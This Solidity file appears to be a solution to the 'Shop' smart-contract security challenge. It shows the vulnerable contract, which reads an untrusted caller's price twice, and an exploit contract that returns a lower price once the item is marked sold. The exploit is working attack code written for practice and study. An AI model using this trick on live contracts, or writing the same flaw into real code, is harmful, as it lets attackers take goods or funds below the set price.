// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

// Thoughts
// 1. attacker uses the shop price first and then switch to custom price

contract ShopSolution is Buyer {
    uint256 public halfPrice = 50;

    function solve(address challengeAddress) public {
        Shop challenge = Shop(challengeAddress);
        challenge.buy();

        require(challenge.isSold());
    }

    function price() external view override returns (uint) {
        Shop challenge = Shop(msg.sender);
        if (challenge.isSold()) {
            return halfPrice;
        }

        return challenge.price();
    }
}